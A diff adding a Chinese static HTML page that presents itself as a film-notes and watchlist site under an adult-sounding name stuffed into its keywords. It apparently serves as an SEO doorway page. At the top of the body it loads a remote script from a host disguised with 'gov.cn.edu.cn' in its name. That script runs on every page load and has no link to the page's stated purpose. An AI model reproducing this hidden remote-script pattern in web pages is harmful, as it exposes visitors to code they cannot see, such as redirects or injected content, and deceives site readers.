@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>午夜成人电影网 - wuyechengrendianyingwang-zh	.github.io | 影讯、片单与观影选片参考</title>
+<meta name="keywords" content="午夜成人电影网,wuyechengrendianyingwang-zh	.github.io,最新上映电影,高分电影推荐,电影片单,观影指南,电影解说,经典老片回顾,热门剧集盘点,午夜成人电影网影评,午夜成人电影网网址,午夜成人电影网官网">
+<meta name="description" content="午夜成人电影网（https://wuyechengrendianyingwang-zh	.github.io）整理每周院线新片口碑、高分片单与经典回看清单，提供按类型、情绪和时长的选片参考，是一份持续更新的观影备忘。本页为午夜成人电影网官网入口。">
+<link rel="canonical" href="https://wuyechengrendianyingwang-zh	.github.io/">
+<style>
+:root{
+  --paper:#f4efe6;--paper2:#efe8db;--ink:#1f1c19;--ink2:#3d3731;
+  --muted:#7a6f62;--line:#d8cdb8;--line2:#e3d9c6;
+  --red:#b23a34;--red2:#d2554d;--gold:#a87b2a;--green:#4f6b4a;--blue:#2f5c73;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  background:var(--paper);color:var(--ink);
+  font-family:"Georgia","Songti SC","SimSun","Source Han Serif SC","Noto Serif CJK SC",serif;
+  line-height:1.75;
+}
+body{background-image:radial-gradient(rgba(0,0,0,.022) 1px,transparent 1px);background-size:5px 5px}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:1080px;margin:0 auto;padding:0 22px}
+.sans{font-family:"Helvetica Neue","PingFang SC","Microsoft YaHei",sans-serif}
+
+/* 顶部 */
+.top{
+  border-bottom:3px double var(--line);padding:10px 0;font-size:12px;color:var(--muted);
+  font-family:"Helvetica Neue","PingFang SC",sans-serif;
+}
+.top .wrap{display:flex;justify-content:space-between;gap:10px;flex-wrap:wrap}
+.top b{font-weight:700;color:var(--ink2)}
+.top em{font-style:normal;color:var(--red);font-variant-numeric:tabular-nums}
+
+/* 报头 */
+.masthead{text-align:center;padding:44px 0 26px;border-bottom:1px solid var(--line)}
+.kicker{font-size:11px;letter-spacing:.42em;color:var(--muted);text-transform:uppercase}
+.masthead h1{
+  font-size:64px;line-height:1;margin:14px 0 10px;letter-spacing:.02em;font-weight:900;
+}
+.masthead h1 span{color:var(--red)}
+.masthead .rule{display:flex;align-items:center;gap:12px;justify-content:center;font-size:12px;color:var(--muted);letter-spacing:.2em}
+.masthead .rule i{font-style:normal;height:1px;width:90px;background:var(--line)}
+.url-line{
+  margin-top:18px;display:inline-flex;align-items:center;gap:10px;font-size:13px;
+  font-family:"Helvetica Neue",sans-serif;background:var(--paper2);border:1px solid var(--line);
+  padding:8px 16px;border-radius:4px;
+}
+.url-line code{font-family:"SFMono-Regular",Consolas,monospace;color:var(--blue);font-size:13px}
+
+/* 导航 */
+.menu{
+  border-bottom:1px solid var(--line);background:var(--paper);position:sticky;top:0;z-index:40;
+  font-family:"Helvetica Neue","PingFang SC",sans-serif;
+}
+.menu ul{display:flex;list-style:none;overflow-x:auto;scrollbar-width:none}
+.menu ul::-webkit-scrollbar{display:none}
+.menu a{padding:15px 18px;font-size:14px;color:var(--ink2);white-space:nowrap;display:block;border-bottom:2px solid transparent}
+.menu a:hover{color:var(--red);border-bottom-color:var(--red);background:var(--paper2)}
+
+/* 引言 */
+.lede{padding:34px 0 8px;font-size:19px;line-height:1.9;color:var(--ink2);text-align:justify}
+.lede::first-letter{font-size:46px;float:left;line-height:.95;padding:4px 10px 0 0;color:var(--red);font-weight:900}
+.dropnote{font-size:12.5px;color:var(--muted);font-family:"Helvetica Neue",sans-serif;border-left:3px solid var(--red);padding-left:12px;margin:20px 0 0}
+
+/* 区块标题 */
+h2.sec{
+  font-size:22px;margin:52px 0 4px;padding-bottom:10px;border-bottom:1px solid var(--line);
+  display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;
+}
+h2.sec small{
+  font-size:11px;letter-spacing:.25em;color:var(--muted);font-weight:400;
+  font-family:"Helvetica Neue",sans-serif;
+}
+h2.sec span.no{color:var(--red);font-weight:900;font-size:14px;font-family:"Helvetica Neue",sans-serif}
+h2.sec a.more{margin-left:auto;font-size:13px;color:var(--red);font-weight:400;font-style:italic}
+h2.sec a.more:hover{text-decoration:underline}
+
+/* 两栏主区 */
+.cols{display:grid;grid-template-columns:1.35fr 1fr;gap:34px;margin-top:22px}
+@media(max-width:860px){.cols{grid-template-columns:1fr}}
+
+/* 新片清单 */
+.filmlist{list-style:none}
+.filmlist li{
+  display:grid;grid-template-columns:44px 1fr;gap:14px;padding:16px 0;border-top:1px dotted var(--line);
+}
+.filmlist li:first-child{border-top:none}
+.filmlist .no{
+  font-size:26px;font-weight:900;color:var(--line);line-height:1;font-family:"Helvetica Neue",sans-serif;
+}
+.filmlist h3{font-size:17px;font-weight:700}
+.filmlist h3 a:hover{color:var(--red)}
+.filmlist .sub{font-size:12.5px;color:var(--muted);margin-top:3px;font-family:"Helvetica Neue",sans-serif}
+.filmlist .kw{margin-top:7px;display:flex;gap:6px;flex-wrap:wrap}
+.filmlist .kw i{font-style:normal;font-size:11px;background:var(--paper2);border:1px solid var(--line);padding:2px 8px;border-radius:3px;color:var(--ink2)}
+.rate{display:inline-block;margin-left:8px;font-size:12px;color:var(--gold);font-family:"Helvetica Neue",sans-serif;letter-spacing:.5px}
+
+/* 片单卡 */
+.listside{border:1px solid var(--line);background:var(--paper2);padding:20px 22px}
+.listside h4{font-size:15px;margin-bottom:14px;color:var(--red);letter-spacing:.05em}
+.listside ol{list-style:none;counter-reset:l}
+.listside ol li{counter-increment:l;padding:9px 0 9px 30px;position:relative;font-size:14.5px;border-top:1px dotted var(--line2)}
+.listside ol li:first-child{border-top:none}
+.listside ol li::before{content:counter(l,decimal-leading-zero);position:absolute;left:0;top:9px;font-size:11px;color:var(--red);font-weight:700;font-family:"Helvetica Neue",sans-serif}
+.listside ol li:hover{color:var(--red)}
+
+/* 类型：手风琴式卡片 */
+.genres{display:grid;grid-template-columns:repeat(2,1fr);gap:14px;margin-top:22px}
+@media(max-width:640px){.genres{grid-template-columns:1fr}}
+.gc{border:1px solid var(--line);background:var(--paper2);padding:16px 18px;display:flex;flex-direction:column;gap:8px;transition:.2s}
+.gc:hover{border-color:var(--red);background:#f7f2e9}
+.gc .toprow{display:flex;align-items:center;justify-content:space-between;gap:10px}
+.gc .nm{font-size:16px;font-weight:700;display:flex;align-items:center;gap:9px}
+.gc .nm::before{content:"";width:7px;height:7px;background:var(--red);transform:rotate(45deg)}
+.gc .ct{font-size:11px;color:var(--muted);font-family:"Helvetica Neue",sans-serif;white-space:nowrap}
+.gc p{font-size:13.5px;color:var(--ink2)}
+.gc .pick{font-size:12.5px;color:var(--ink);border-top:1px dotted var(--line2);padding-top:8px}
+.gc .pick b{color:var(--red);font-weight:700}
+
+/* 经典：九宫格 */
+.classic{display:grid;grid-template-columns:repeat(3,1fr);gap:1px;background:var(--line);border:1px solid var(--line);margin-top:22px}
+@media(max-width:760px){.classic{grid-template-columns:repeat(2,1fr)}}
+.c9{background:var(--paper);padding:18px 16px;min-height:118px;display:flex;flex-direction:column;justify-content:space-between}
+.c9 .yr{font-size:11px;color:var(--muted);font-family:"Helvetica Neue",sans-serif;letter-spacing:.1em}
+.c9 h4{font-size:16px;font-weight:700;margin:6px 0 2px}
+.c9 .star{font-size:12px;color:var(--gold);letter-spacing:.5px;font-family:"Helvetica Neue",sans-serif}
+.c9 .tp{font-size:12px;color:var(--ink2)}
+
+/* 剧集：时间轴 */
+.tvlane{margin-top:22px;padding-left:6px}
+.tvrow{display:grid;grid-template-columns:104px 1fr;gap:18px;padding:16px 0;border-top:1px solid var(--line)}
+.tvrow:first-child{border-top:none}
+.tvrow .day{
+  font-family:"Helvetica Neue",sans-serif;font-size:12px;color:var(--muted);letter-spacing:.08em;padding-top:3px;
+}
+.tvrow .day b{display:block;font-size:20px;color:var(--ink);font-weight:900;line-height:1.1}
+.tvrow .body h4{font-size:16px;font-weight:700}
+.tvrow .body h4 em{font-style:normal;font-size:12px;color:var(--green);margin-left:8px;font-family:"Helvetica Neue",sans-serif}
+.tvrow .body p{font-size:13.5px;color:var(--ink2);margin-top:4px}
+.tvrow .meta{font-size:11.5px;color:var(--muted);margin-top:7px;font-family:"Helvetica Neue",sans-serif;display:flex;gap:14px;flex-wrap:wrap}
+.tvrow .meta i{font-style:normal;color:var(--red)}
+
+/* 问答 */
+.qwrap{display:grid;grid-template-columns:1fr 1fr;gap:34px;margin-top:22px}
+@media(max-width:860px){.qwrap{grid-template-columns:1fr}}
+.qcol h4{font-size:15px;color:var(--red);margin-bottom:12px;border-bottom:1px solid var(--line);padding-bottom:8px}
+.qcol dl{}
+.qcol dt{font-size:15px;font-weight:700;margin-top:16px}
+.qcol dt:first-child{margin-top:0}
+.qcol dd{font-size:13.5px;color:var(--ink2);margin-top:5px;text-align:justify}
+.qcol dt::before{content:"Q";color:var(--red);font-weight:900;margin-right:7px;font-family:"Helvetica Neue",sans-serif}
+.qcol dd::before{content:"A";color:var(--muted);font-weight:700;margin-right:7px;font-family:"Helvetica Neue",sans-serif}
+
+/* 关于 */
+.about{margin-top:22px;border:1px solid var(--line);background:var(--paper2)}
+.about table{width:100%;border-collapse:collapse;font-family:"Helvetica Neue","PingFang SC",sans-serif}
+.about th{background:var(--ink);color:var(--paper);text-align:left;padding:12px 18px;font-size:12px;letter-spacing:.1em;font-weight:500}
+.about td{padding:14px 18px;border-top:1px solid var(--line2);font-size:14px;vertical-align:top}
+.about td:first-child{color:var(--muted);width:150px;font-size:12.5px;letter-spacing:.05em}
+.about a{color:var(--blue)}
+.about a:hover{text-decoration:underline}
+.about .note{font-size:12.5px;color:var(--muted);font-style:italic}
+
+/* 页脚 */
+footer{margin-top:56px;border-top:3px double var(--line);background:var(--ink);color:var(--paper2);padding:38px 0 24px}
+footer .wrap{font-family:"Helvetica Neue","PingFang SC",sans-serif}
+.foot-cols{display:grid;grid-template-columns:1.6fr 1fr 1fr 1fr;gap:28px;margin-bottom:26px}
+@media(max-width:760px){.foot-cols{grid-template-columns:repeat(2,1fr)}}
+.foot-cols h4{font-size:15px;color:#fff;margin-bottom:12px}
+.foot-cols p,.foot-cols li{font-size:13px;color:#b9aea0;line-height:1.9}
+.foot-cols ul{list-style:none}
+.foot-cols a{color:#b9aea0}
+.foot-cols a:hover{color:var(--red2)}
+.foot-cols .name{font-family:"Georgia","Songti SC",serif;font-size:22px;font-weight:900;color:#fff}
+.foot-bot{border-top:1px solid #3a342e;padding-top:18px;font-size:12px;color:#8c8173;text-align:center;line-height:1.9}
+.foot-bot a{color:var(--red2)}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<div class="top">
+  <div class="wrap">
+    <span><b>午夜成人电影网 · 观影备忘与片单整理</b></span>
+    <span>更新于 <em id="today"></em> · 每周二、五发布新一期</span>
+  </div>
+</div>
+
+<header class="masthead">
+  <div class="wrap">
+    <div class="kicker">Film &amp; Viewing Notes</div>
+    <h1>电影<span>网</span></h1>
+    <div class="rule"><i></i>影讯 · 片单 · 选片参考<i></i></div>
+    <div class="url-line">网站网址 <code>https://wuyechengrendianyingwang-zh	.github.io</code></div>
+  </div>
+</header>
+
+<nav class="menu">
+  <div class="wrap">
+    <ul>
+      <li><a href="#home">首页</a></li>
+      <li><a href="#new">院线新片</a></li>
+      <li><a href="#lists">精选片单</a></li>
+      <li><a href="#genre">类型分类</a></li>
+      <li><a href="#classic">经典回看</a></li>
+      <li><a href="#tv">剧集动态</a></li>
+      <li><a href="#faq">常见问题</a></li>
+      <li><a href="#about">关于本站</a></li>
+    </ul>
+  </div>
+</nav>
+
+<main class="wrap" id="home">
+
+  <p class="lede">这里是<strong>午夜成人电影网</strong>，一份由编辑整理、持续更新的观影备忘。我们不提供播放与下载，只把每周值得关注的院线新片、口碑浮动和经典回看，按类型、情绪与时长排成一份可以随手翻阅的片单，让你在打开屏幕之前，先想清楚今晚要看什么。</p>
+  <p class="dropnote">说明：本站（<strong>午夜成人电影网</strong>，网址 <code>wuyechengrendianyingwang-zh	.github.io</code>）为静态资讯页面，所有内页链接以占位形式呈现，正式上线后替换为真实栏目地址。</p>
+
+  <!-- 院线新片 -->
+  <h2 class="sec" id="new"><span class="no">01.</span>院线新片 <small>IN THEATERS</small><a class="more" href="#">完整排片 →</a></h2>
+  <div class="cols">
+    <ul class="filmlist">
+      <li><span class="no">01</span><div><h3><a href="#">逆光者 <span class="rate">★ 8.3</span></a></h3><div class="sub">犯罪 / 悬疑 · 136 分钟 · 导演：陈默</div><div class="kw"><i>本周首选</i><i>反转密集</i><i>口碑上升</i></div></div></li>
+      <li><span class="no">02</span><div><h3><a href="#">山那边的海 <span class="rate">★ 8.0</span></a></h3><div class="sub">剧情 / 家庭 · 118 分钟 · 导演：林知夏</div><div class="kw"><i>文艺向</i><i>适合两人看</i><i>口碑稳定</i></div></div></li>
+      <li><span class="no">03</span><div><h3><a href="#">代号夜莺 <span class="rate">★ 7.6</span></a></h3><div class="sub">动作 / 谍战 · 129 分钟 · 导演：周远</div><div class="kw"><i>视效大片</i><i>男性向</i><i>IMAX 推荐</i></div></div></li>
+      <li><span class="no">04</span><div><h3><a href="#">第八次相遇 <span class="rate">★ 8.1</span></a></h3><div class="sub">爱情 / 都市 · 107 分钟 · 导演：苏晴</div><div class="kw"><i>女性向</i><i>轻松不虐</i><i>周末首选</i></div></div></li>
+      <li><span class="no">05</span><div><h3><a href="#">白鲸与少年 <span class="rate">★ 8.5</span></a></h3><div class="sub">动画 / 冒险 · 96 分钟 · 适合全家观看</div><div class="kw"><i>合家欢</i><i>画面惊艳</i><i>儿童适宜</i></div></div></li>
+    </ul>
+    <aside class="listside">
+      <h4>本周编辑片单 · 按心情选</h4>
+      <ol>
+        <li>想被剧情抓住：逆光者</li>
+        <li>想安静看完：山那边的海</li>
+        <li>想提神醒脑：代号夜莺</li>
+        <li>想轻松一点：第八次相遇</li>
+        <li>带小朋友看：白鲸与少年</li>
+        <li>时间紧张：选 90 分钟以内的短片</li>
+      </ol>
+    </aside>
+  </div>
+
+  <!-- 精选片单 -->
+  <h2 class="sec" id="lists"><span class="no">02.</span>精选片单 <small>WATCHLISTS</small><a class="more" href="#">更多片单 →</a></h2>
+  <div class="cols">
+    <div class="listside" style="background:var(--paper);border:none;padding:0">
+      <h4 style="color:var(--ink)">一、适合一个人看的十部电影</h4>
+      <ol>
+        <li>路边野餐 —— 慢节奏，需要耐心</li>
+        <li>地球最后的夜晚 —— 情绪大于剧情</li>
+        <li>心迷宫 —— 结构精巧的乡土悬疑</li>
+        <li>山河故人 —— 时间跨度带来的感慨</li>
+        <li>撞死了一只羊 —— 影像风格强烈</li>
+      </ol>
+    </div>
+    <div class="listside" style="background:var(--paper);border:none;padding:0">
+      <h4 style="color:var(--ink)">二、适合和朋友一起看的十部电影</h4>
+      <ol>
+        <li>疯狂的石头 —— 群像喜剧，笑点密集</li>
+        <li>让子弹飞 —— 台词值得反复嚼</li>
+        <li>你好，疯子！ —— 反转在最后一刻</li>
+        <li>扬名立万 —— 封闭空间推理</li>
+        <li>驴得水 —— 笑完之后会沉默</li>
+      </ol>
+    </div>
+  </div>
+
+  <!-- 类型分类 -->
+  <h2 class="sec" id="genre"><span class="no">03.</span>类型分类 <small>BY GENRE</small><a class="more" href="#">全部分类 →</a></h2>
+  <div class="genres">
+    <div class="gc"><div class="toprow"><span class="nm">悬疑犯罪</span><span class="ct">112 部</span></div><p>靠信息差和反转推动，适合专注观看，中途退出容易漏线索。</p><div class="pick"><b>本周挑一部：</b>逆光者</div></div>
+    <div class="gc"><div class="toprow"><span class="nm">剧情家庭</span><span class="ct">86 部</span></div><p>节奏偏慢，胜在人物与情感，适合周末下午或睡前一段。</p><div class="pick"><b>本周挑一部：</b>山那边的海</div></div>
+    <div class="gc"><div class="toprow"><span class="nm">动作冒险</span><span class="ct">74 部</span></div><p>视效与节奏优先，建议大屏或影院，注意音量。</p><div class="pick"><b>本周挑一部：</b>代号夜莺</div></div>
+    <div class="gc"><div class="toprow"><span class="nm">爱情都市</span><span class="ct">63 部</span></div><p>门槛低，适合两个人看，注意区分甜与虐。</p><div class="pick"><b>本周挑一部：</b>第八次相遇</div></div>
+    <div class="gc"><div class="toprow"><span class="nm">动画合家欢</span><span class="ct">41 部</span></div><p>不只是给孩子，不少作品大人也能看出另一层。</p><div class="pick"><b>本周挑一部：</b>白鲸与少年</div></div>
+    <div class="gc"><div class="toprow"><span class="nm">纪录自然</span><span class="ct">38 部</span></div><p>真实影像，适合补知识，也适合做背景音。</p><div class="pick"><b>近期关注：</b>深蓝来信（四集完）</div></div>
+  </div>
+
+  <!-- 经典回看 -->
+  <h2 class="sec" id="classic"><span class="no">04.</span>经典回看 <small>CLASSICS</small><a class="more" href="#">完整片库 →</a></h2>
+  <div class="classic">
+    <div class="c9"><span class="yr">1994</span><h4>肖申克的救赎</h4><span class="tp">剧情 / 人性</span><span class="star">★ 9.7</span></div>
+    <div class="c9"><span class="yr">1993</span><h4>霸王别姬</h4><span class="tp">剧情 / 戏曲</span><span class="star">★ 9.6</span></div>
+    <div class="c9"><span class="yr">1957</span><h4>十二怒汉</h4><span class="tp">犯罪 / 法庭</span><span class="star">★ 9.4</span></div>
+    <div class="c9"><span class="yr">1994</span><h4>阿甘正传</h4><span class="tp">剧情 / 励志</span><span class="star">★ 9.5</span></div>
+    <div class="c9"><span class="yr">2000</span><h4>一一</h4><span class="tp">剧情 / 家庭</span><span class="star">★ 9.0</span></div>
+    <div class="c9"><span class="yr">2002</span><h4>无间道</h4><span class="tp">犯罪 / 警匪</span><span class="star">★ 9.3</span></div>
+    <div class="c9"><span class="yr">2014</span><h4>星际穿越</h4><span class="tp">科幻 / 亲情</span><span class="star">★ 9.4</span></div>
+    <div class="c9"><span class="yr">2010</span><h4>盗梦空间</h4><span class="tp">科幻 / 悬疑</span><span class="star">★ 9.3</span></div>
+    <div class="c9"><span class="yr">2001</span><h4>千与千寻</h4><span class="tp">动画 / 奇幻</span><span class="star">★ 9.4</span></div>
+  </div>
+
+  <!-- 剧集动态 -->
+  <h2 class="sec" id="tv"><span class="no">05.</span>剧集动态 <small>TV &amp; SERIES</small><a class="more" href="#">全部剧集 →</a></h2>
+  <div class="tvlane">
+    <div class="tvrow"><div class="day"><b>周一</b>MON</div><div class="body"><h4>沉默的谈判者 <em>更新至 22/32</em></h4><p>刑侦群像，单元案件加主线并行，每集一个独立案件，断点续看也不乱。</p><div class="meta"><span><i>●</i> 国产</span><span>刑侦 / 犯罪</span><span>口碑稳定</span></div></div></div>
+    <div class="tvrow"><div class="day"><b>周三</b>WED</div><div class="body"><h4>首尔的雪夜 <em>已完结 16 集</em></h4><p>律政与财阀博弈，节奏快，人物关系复杂，建议一口气刷完再回头复盘。</p><div class="meta"><span><i>●</i> 韩剧</span><span>律政 / 财阀</span><span>适合连看</span></div></div></div>
+    <div class="tvrow"><div class="day"><b>周五</b>FRI</div><div class="body"><h4>伦敦谜案集 <em>第二季回归</em></h4><p>维多利亚时代背景的推理小品，单集一案，服化道考究，适合当周五放松。</p><div class="meta"><span><i>●</i> 英剧</span><span>悬疑 / 推理</span><span>每集 55 分钟</span></div></div></div>
+    <div class="tvrow"><div class="day"><b>周日</b>SUN</div><div class="body"><h4>一城一味 <em>本周走进潮汕</em></h4><p>美食纪实，镜头朴素，配乐克制，看的时候容易饿，建议饭后打开。</p><div class="meta"><span><i>●</i> 国产</span><span>美食 / 纪实</span><span>每集 40 分钟</span></div></div></div>
+  </div>
+
+  <!-- 常见问题 -->
+  <h2 class="sec" id="faq"><span class="no">06.</span>常见问题 <small>FAQ</small></h2>
+  <div class="qwrap">
+    <div class="qcol">
+      <h4>关于午夜成人电影网</h4>
+      <dl>
+        <dt>午夜成人电影网是什么网站？</dt>
+        <dd>午夜成人电影网（wuyechengrendianyingwang-zh	.github.io）是一份影视资讯与选片参考页面，整理院线新片、高分片单、经典回看和剧集动态，帮助读者在海量片源中快速做决定。</dd>
+        <dt>网站内容多久更新？</dt>
+        <dd>每周二、五发布新一期，院线栏目跟随上映与口碑浮动调整，剧集栏目同步更新进度。</dd>
+        <dt>午夜成人电影网提供在线播放吗？</dt>
+        <dd>不提供。本站不提供在线播放、下载或资源分享服务，也不跳转任何第三方播放源，仅做资讯与选片整理。</dd>
+      </dl>
+    </div>
+    <div class="qcol">
+      <h4>关于网站本身</h4>
+      <dl>
+        <dt>网站网址是什么？</dt>
+        <dd>网站名称为「午夜成人电影网」，网址是 <a href="https://wuyechengrendianyingwang-zh	.github.io" style="color:var(--red)">https://wuyechengrendianyingwang-zh	.github.io</a>，由 GitHub Pages 静态托管。</dd>
+        <dt>域名在哪里能看到？</dt>
+        <dd>域名同时出现在页面顶部网址条、本栏目问答与页脚版权信息中，三种写法略有不同，但都指向同一站点。</dd>
+        <dt>栏目链接现在能点开吗？</dt>
+        <dd>本页为单文件演示版本，内页链接以占位形式呈现，上线后替换为真实栏目地址即可。</dd>
+      </dl>
+    </div>
+  </div>
+
+  <!-- 关于本站 -->
+  <h2 class="sec" id="about"><span class="no">07.</span>关于本站 <small>ABOUT</small></h2>
+  <div class="about">
+    <table>
+      <thead><tr><th colspan="2">站点档案</th></tr></thead>
+      <tbody>
+        <tr><td>网站名称</td><td>午夜成人电影网</td></tr>
+        <tr><td>网站网址</td><td><a href="https://wuyechengrendianyingwang-zh	.github.io">https://wuyechengrendianyingwang-zh	.github.io</a></td></tr>
+        <tr><td>内容栏目</td><td>院线新片、精选片单、类型分类、经典回看、剧集动态、常见问题、关于本站，共 7 个板块</td></tr>
+        <tr><td>更新频率</td><td>每周二、五更新，重点栏目跟随口碑与排片调整</td></tr>
+        <tr><td>站点定位</td><td>影视资讯与选片参考，不提供播放、下载或资源分享服务</td></tr>
+        <tr><td class="note" colspan="2">注：本页为单文件静态页面，所有跳转链接以占位形式呈现，正式上线后替换为对应栏目地址。</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="foot-cols">
+      <div>
+        <div class="name">午夜成人电影网</div>
+        <p style="margin-top:8px">一份持续更新的观影备忘：影讯、片单与选片参考，帮你把「今晚看什么」这件事想清楚。</p>
+      </div>
+      <div>
+        <h4>内容栏目</h4>
+        <ul>
+          <li><a href="#new">院线新片</a></li>
+          <li><a href="#lists">精选片单</a></li>
+          <li><a href="#genre">类型分类</a></li>
+          <li><a href="#classic">经典回看</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>更多内容</h4>
+        <ul>
+          <li><a href="#tv">剧集动态</a></li>
+          <li><a href="#faq">常见问题</a></li>
+          <li><a href="#about">关于本站</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>网站信息</h4>
+        <ul>
+          <li>名称：午夜成人电影网</li>
+          <li><a href="https://wuyechengrendianyingwang-zh	.github.io">wuyechengrendianyingwang-zh	.github.io</a></li>
+          <li>静态托管 · 访问稳定</li>
+        </ul>
+      </div>
+    </div>
+    <div class="foot-bot">
+      网站名称：午夜成人电影网 ｜ 网站网址：<a href="https://wuyechengrendianyingwang-zh	.github.io">https://wuyechengrendianyingwang-zh	.github.io</a><br>
+      © 2026 午夜成人电影网 · 本站仅提供影视资讯与选片参考，不提供在线播放、下载或资源分享服务
+    </div>
+  </div>
+</footer>
+
+<script>
+document.getElementById('today').textContent = (function(){
+  var d = new Date(), p = function(n){return n<10?'0'+n:''+n};
+  return d.getFullYear() + '.' + p(d.getMonth()+1) + '.' + p(d.getDate());
+})();
+</script>
+
+</body>
+</html>
